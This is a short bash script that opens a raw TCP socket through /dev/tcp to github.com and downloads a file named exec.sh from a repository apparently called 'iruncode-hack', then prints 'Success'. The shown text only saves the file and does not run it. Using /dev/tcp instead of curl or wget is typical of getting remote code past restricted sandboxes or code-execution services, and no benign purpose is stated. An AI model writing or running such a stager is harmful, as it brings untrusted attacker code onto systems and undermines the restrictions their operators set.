#!/bin/bash

host="github.com"
port="80"
path="/d0m-1k/iruncode-hack/raw/refs/heads/main/exec.sh"

request="GET $path HTTP/1.1
Host: $host
Connection: close"

exec 3<>/dev/tcp/$host/$port
echo -e "$request" >&3
cat <&3 > exec.sh
exec 3>&-

echo "Success"
